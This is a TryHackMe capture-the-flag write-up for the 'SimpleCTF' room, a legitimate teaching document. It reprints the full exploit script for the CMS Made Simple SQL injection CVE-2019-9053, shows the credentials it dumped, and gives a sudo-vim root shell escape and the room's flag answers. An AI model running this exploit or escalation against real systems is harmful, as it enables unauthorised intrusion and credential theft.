# TryHackMe CTF

> This write-up has been reformatted using AI from my original notes for clarity and better viewing

## Machine Information

| Field            | Details    |
| ---------------- | ---------- |
| **Machine Name** | SimpleCTF  |
| **Date**         | 2/21/2026  |
| **Completed**    | 2/22/2026  |
| **Attacker OS**  | Kali Linux |
| **Difficulty**   | Easy       |

---

## Room Questions

### Task 1: Simple CTF

| Question                                                        | Answer                                                                |
| --------------------------------------------------------------- | --------------------------------------------------------------------- |
| How many services are running under port 1000?                  | <details><summary>Reveal</summary>`2`</details>                       |
| What is running on the higher port?                             | <details><summary>Reveal</summary>`SSH`</details>                     |
| What's the CVE you're using against the application?            | <details><summary>Reveal</summary>`CVE-2019-9053`</details>           |
| To what kind of vulnerability is the application vulnerable?    | <details><summary>Reveal</summary>`sqli`</details>                    |
| What's the password?                                            | <details><summary>Reveal</summary>`secret`</details>                  |
| Where can you login with the details obtained?                  | <details><summary>Reveal</summary>`SSH`</details>                     |
| What's the user flag?                                           | <details><summary>Reveal</summary>`G00d j0b, keep up!`</details>      |
| Is there any other user in the home directory? What's its name? | <details><summary>Reveal</summary>`sunbath`</details>                 |
| What can you leverage to spawn a privileged shell?              | <details><summary>Reveal</summary>`vim`</details>                     |
| Is there any other user in the home directory? What's its name? | <details><summary>Reveal</summary>`W3ll d0n3. You made it!`</details> |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -p- -vv 10.67.129.203
```

### Nmap Output

```bash
Nmap scan report for 10.67.129.203
Host is up, received echo-reply ttl 62 (0.035s latency).
Scanned at 2026-02-20 22:36:13 EST for 161s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.133.88
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:38
Completed NSE at 22:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:38
Completed NSE at 22:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:38
Completed NSE at 22:38, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.88 seconds
Raw packets sent: 131163 (5.771MB) | Rcvd: 96 (4.208KB)
```

### Scan Summary

**Scan Date:** 2026-02-20 at 22:36:13 EST | **Duration:** 161 seconds | **Host Status:** Up (latency: 0.035s, TTL: 62)

#### Open Ports

| Port     | State | Service | Version                         |
| -------- | ----- | ------- | ------------------------------- |
| 21/tcp   | Open  | FTP     | vsftpd 3.0.3                    |
| 80/tcp   | Open  | HTTP    | Apache httpd 2.4.18 (Ubuntu)    |
| 2222/tcp | Open  | SSH     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |

> 65,532 filtered TCP ports not shown (no-response)

#### Port 21 — FTP

**Service:** vsftpd 3.0.3 | **Anonymous Login:** ✅ Allowed

```plaintext
FTP server status:
     Connected to ::ffff:192.168.133.88
     Logged in as ftp
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is 300
     Control connection is plain text
     Data connections will be plain text
     vsFTPd 3.0.3 - secure, fast, stable
```

#### Port 80 — HTTP

**Service:** Apache httpd 2.4.18 (Ubuntu) | **Page Title:** Apache2 Ubuntu Default Page | **Server Header:** `Apache/2.4.18 (Ubuntu)`

Supported Methods: `OPTIONS` `GET` `HEAD` `POST`

| robots.txt Entry   | Notes                              |
| ------------------ | ---------------------------------- |
| `/`                | Disallowed                         |
| `/openemr-5_0_1_3` | Disallowed — **high value target** |

#### Port 2222 — SSH

**Service:** OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

| Key Type | Bits | Fingerprint                                       |
| -------- | ---- | ------------------------------------------------- |
| RSA      | 2048 | `29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23` |
| ECDSA    | 256  | `9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c` |
| ED25519  | 256  | `12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6` |

**Notes:**

- FTP allows **anonymous login** — worth investigating immediately
- `/openemr-5_0_1_3` is listed in robots.txt — OpenEMR is a known medical records application with public CVEs worth researching
- SSH is running on non-standard port **2222** instead of the default 22

---

### Web Enumeration

```bash
gobuster dir -u http://10.67.129.203 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,js,xml,json,bak,old,zip,sql,conf,ini,log,asp,aspx,jsp,sh,py,rb,cfg,env -t 50
```

### Gobuster Output

```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.67.129.203
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              cfg,old,sql,asp,sh,py,rb,env,php,html,jsp,bak,zip,log,aspx,txt,js,xml,json,conf,ini
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 11321]
robots.txt           (Status: 200) [Size: 929]
simple               (Status: 301) [Size: 315] [--> http://10.67.129.203/simple/]
server-status        (Status: 403) [Size: 301]
Progress: 659978 / 659978 (100.00%)
===============================================================
Finished
===============================================================
```

### Directory Analysis

| Path             | Status | Notes                                        |
| ---------------- | ------ | -------------------------------------------- |
| `/index.html`    | 200    | Main landing page                            |
| `/robots.txt`    | 200    | **Worth reading — may contain hidden paths** |
| `/simple`        | 301    | **High value — investigate further**         |
| `/server-status` | 403    | Apache status page, restricted               |

`Robots.txt`

```HTML
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

Robots.txt showed us another directory `openemr-5_0_1_3`

This directory is now showing anything but it gives us a possible application

`/simple`

![simple](https://dgwiki.dg4e.net/users/saintmichael/tryhackme/easy/img/simplectf1.png)

This site is powered by CMS Made Simple version 2.2.8

Appears this is vulnerable to CVE-2019-9053

[ExploitDB](https://www.exploit-db.com/exploits/46635)

So we downloaded the Python script.

After reviewing the script, it appears to be a time-based SQLi

```python
#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053

import requests
from termcolor import colored
import time
from termcolor import cprint
import optparse
import hashlib

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)

options, args = parser.parse_args()
if not options.url:
    print "[+] Specify an url target"
    print "[+] Example usage (no cracking password): exploit.py -u http://target-uri"
    print "[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist"
    print "[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based."
    exit()

url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

salt = ''
wordlist = ""
if options.wordlist:
    wordlist += options.wordlist

def crack_password():
    global password
    global output
    global wordlist
    global salt
    dict = open(wordlist)
    for line in dict.readlines():
        line = line.replace("\n", "")
        beautify_print_try(line)
        if hashlib.md5(str(salt) + line).hexdigest() == password:
            output += "\n[+] Password cracked: " + line
            break
    dict.close()

def beautify_print_try(value):
    global output
    print "\033c"
    cprint(output,'green', attrs=['bold'])
    cprint('[*] Try: ' + value, 'red', attrs=['bold'])

def beautify_print():
    global output
    print "\033c"
    cprint(output,'green', attrs=['bold'])

def dump_salt():
    global flag
    global salt
    global output
    ord_salt = ""
    ord_salt_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            salt = temp_salt
            ord_salt = ord_salt_temp
    flag = True
    output += '\n[+] Salt for password found: ' + salt

def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password

def dump_username():
    global flag
    global db_name
    global output
    ord_db_name = ""
    ord_db_name_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True

def dump_email():
    global flag
    global email
    global output
    ord_email = ""
    ord_email_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_email = email + dictionary[i]
            ord_email_temp = ord_email + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_email)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            email = temp_email
            ord_email = ord_email_temp
    output += '\n[+] Email found: ' + email
    flag = True

dump_salt()
dump_username()
dump_email()
dump_password()

if options.cracking:
    print colored("[*] Now try to crack password")
    crack_password()

beautify_print()
```

After doing some investigating with claude, we can run the following command:

`python2 46635.py -u http://10.65.161.255/simple --crack -w /usr/share/wordlists/rockyou.txt`

While attempting to run this exploit, I ran into some issues

```bash

saintmichael@archangelkali~/THM/CTF/easy/simplectf/files >python2 46635.py -u http://10.65.161.255/simple --crack -w /usr/share/wordlists/rockyou.txt
Traceback (most recent call last):
  File "46635.py", line 12, in <module>
    from termcolor import colored
ImportError: No module named termcolor
saintmichael@archangelkali~/THM/CTF/easy/simplectf/files >curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
saintmichael@archangelkali~/THM/CTF/easy/simplectf/files >python2 get-pip.py
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting pip<21.0
  Downloading pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
     |████████████████████████████████| 1.5 MB 2.4 MB/s
Collecting wheel
  Downloading wheel-0.37.1-py2.py3-none-any.whl (35 kB)
Installing collected packages: pip, wheel
Successfully installed pip-20.3.4 wheel-0.37.1
saintmichael@archangelkali~/THM/CTF/easy/simplectf/files >python2 -m pip install termcolor requests
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting termcolor
  Downloading termcolor-1.1.0.tar.gz (3.9 kB)
    ERROR: Command errored out with exit status 1:
     command: /usr/bin/python2 -c 'import sys, setuptools, tokenize; sys.argv[0] = '"'"'/tmp/pip-install-k7hj_E/termcolor/setup.py'"'"'; __file__='"'"'/tmp/pip-install-k7hj_E/termcolor/setup.py'"'"';f=getattr(tokenize, '"'"'open'"'"', open)(__file__);code=f.read().replace('"'"'\r\n'"'"', '"'"'\n'"'"');f.close();exec(compile(code, __file__, '"'"'exec'"'"'))' egg_info --egg-base /tmp/pip-pip-egg-info-rZATP6
         cwd: /tmp/pip-install-k7hj_E/termcolor/
    Complete output (6 lines):
    usage: setup.py [global_opts] cmd1 [cmd1_opts] [cmd2 [cmd2_opts] ...]
       or: setup.py --help [cmd1 cmd2 ...]
       or: setup.py --help-commands
       or: setup.py cmd --help

    error: invalid command 'egg_info'
    ----------------------------------------
ERROR: Command errored out with exit status 1: python setup.py egg_info Check the logs for full command output.
saintmichael@archangelkali~/THM/CTF/easy/simplectf/files >python2 -m pip install --upgrade setuptools
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting setuptools
  Downloading setuptools-44.1.1-py2.py3-none-any.whl (583 kB)
     |████████████████████████████████| 583 kB 2.3 MB/s
Installing collected packages: setuptools
Successfully installed setuptools-44.1.1
saintmichael@archangelkali~/THM/CTF/easy/simplectf/files >python2 -m pip install termcolor requests
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Defaulting to user installation because normal site-packages is not writeable
Collecting termcolor
  Using cached termcolor-1.1.0.tar.gz (3.9 kB)
Collecting requests
  Downloading requests-2.27.1-py2.py3-none-any.whl (63 kB)
     |████████████████████████████████| 63 kB 1.7 MB/s
Collecting idna<3,>=2.5; python_version < "3"
  Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
     |████████████████████████████████| 58 kB 3.7 MB/s
Collecting chardet<5,>=3.0.2; python_version < "3"
  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
     |████████████████████████████████| 178 kB 2.7 MB/s
Collecting urllib3<1.27,>=1.21.1
  Downloading urllib3-1.26.20-py2.py3-none-any.whl (144 kB)
     |████████████████████████████████| 144 kB 3.4 MB/s
Collecting certifi>=2017.4.17
  Downloading certifi-2021.10.8-py2.py3-none-any.whl (149 kB)
     |████████████████████████████████| 149 kB 3.4 MB/s
Building wheels for collected packages: termcolor
  Building wheel for termcolor (setup.py) ... done
  Created wheel for termcolor: filename=termcolor-1.1.0-py2-none-any.whl size=4830 sha256=79858995c5ca836d3062e2a2fec2b386774835d6969829650a6231270ce66e6d
  Stored in directory: /home/saintmichael/.cache/pip/wheels/48/54/87/2f4d1a48c87e43906477a3c93d9663c49ca092046d5a4b00b4
Successfully built termcolor
Installing collected packages: termcolor, idna, chardet, urllib3, certifi, requests
Successfully installed certifi-2021.10.8 chardet-4.0.0 idna-2.10 requests-2.27.1 termcolor-1.1.0 urllib3-1.26.20
```

Now let's try to run it again!

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: 8
[+] Email found: admin@5
[+] Password found: 0c01f4468bd75d7y
```

It appears we were given a false output so we changed the time on the python script from `1` to `3`

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

---

## 2. Exploring SSH

```bash
saintmichael@archangelkali~/THM/CTF/easy/simplectf/files >ssh -p 2222 mitch@10.65.161.255
The authenticity of host '[10.65.161.255]:2222 ([10.65.161.255]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.65.161.255]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mitch@10.65.161.255's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up! <User flag
$ cd ..
$ ls
mitch  sunbath
$ cd sunbath
-sh: 12: cd: can't cd to sunbath

```

## 3. Privilege Escalation

Let's figure out what permissions we have with sudo!

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

After doing a little research we can run the following command to possibly spawn a root shell

`sudo vim`
`:shell`

```bash

$ sudo vim

root@Machine:/home#
root@Machine:/home# cd ..
root@Machine:/# cd root
root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt
W3ll d0n3. You made it!
```

---

> **New to CTFs?** This section breaks down the core concepts used in this room so you can understand _why_ each step worked — not just _what_ was done.

---

## Key Takeaways for Beginners

### 1. Always Start with a Port Scan

The first thing you do when attacking a machine is find out what's running on it. **Nmap** is the standard tool for this. In this room we found three services: FTP on port 21, HTTP on port 80, and SSH on the non-standard port 2222. The web server became our initial foothold.

> Think of ports like doors on a building — Nmap tells you which ones are open and what's behind them.

---

### 2. Directory Busting Finds Hidden Pages

Websites often have pages that aren't linked anywhere publicly. Tools like **Gobuster** brute-force common directory names to uncover them. Here we found `/simple/` — a CMS Made Simple installation that turned out to be our attack surface.

> If a door isn't listed publicly, it doesn't mean it doesn't exist. Gobuster checks them all.

---

### 3. Known CVEs Are Powerful — Check the Version Number

Once we identified the software (CMS Made Simple 2.2.8), we searched for known vulnerabilities and found **CVE-2019-9053** on ExploitDB. Version numbers are critical — developers patch vulnerabilities in newer releases, so an outdated version often means a public exploit already exists.

> Always Google the software name and version number together. Chances are someone has already found a way in.

---

### 4. Time-Based SQL Injection Leaks Data Through Timing

**SQL Injection** tricks a web app's database into executing unintended queries. In the **time-based blind** variant used here, we can't see the database output directly — instead we measure how long the server takes to respond. If our injected `sleep()` command fires, we know our condition was true. The exploit builds up extracted data one character at a time.

> You don't need to see the answer — you just need to ask yes/no questions fast enough.

---

### 5. Password Hashes Need Cracking — Salts Make It Harder

The database stored passwords as **MD5 hashes** — a one-way scramble of the real password. A **salt** is a random string added to the password before hashing to make precomputed cracking attempts useless. To crack it, the script combined the recovered salt with each word in **rockyou.txt** and checked if the result matched. The plaintext password was `secret`.

> A hash is a fingerprint of a password. Cracking it means finding the original finger.

---

### 6. Timing Matters in Time-Based Exploits

Our first run produced garbage output — usernames and emails were clearly wrong. This was because the default 1-second timeout was too short for our network latency, causing the script to misread responses. Increasing `TIME` to `3` gave the server enough time to respond properly and produced clean results.

> If a time-based exploit gives weird output, slow it down. Network lag is the enemy of precision timing.

---

### 7. `sudo -l` Is One of the First Things to Run After Getting a Shell

Once on the machine, checking `sudo -l` tells you what commands your current user can run as root. Here, `vim` was misconfigured to run as root without a password — a classic privilege escalation opportunity.

> Always check what permissions you already have before looking for complex exploits. The path to root might be one command away.

---

### 8. GTFOBins Turns Trusted Programs Into Root Shells

When you find a binary you can run as root via sudo, check **[GTFOBins](https://gtfobins.github.io/)** — a curated reference of Unix programs that can be abused to escape into a shell. Since `vim` was allowed, we launched it as root and used its built-in `:shell` command to drop into a root terminal.

> A text editor running as root can do a lot more than edit text.

---

### Tools Used in This Room

| Tool        | Purpose                                            |
| ----------- | -------------------------------------------------- |
| `nmap`      | Port scanning and service detection                |
| `gobuster`  | Web directory enumeration                          |
| `python2`   | Running the CVE-2019-9053 exploit script           |
| `ssh`       | Remote login with recovered credentials            |
| `sudo -l`   | Checking available sudo permissions                |
| `vim`       | Abused via GTFOBins to spawn a root shell          |
| ExploitDB   | Finding public exploits for known CVEs             |
| GTFOBins    | Reference for sudo/SUID privilege escalation       |
| rockyou.txt | Wordlist used to crack the recovered password hash |

> This write-up was created by `saintmichael`
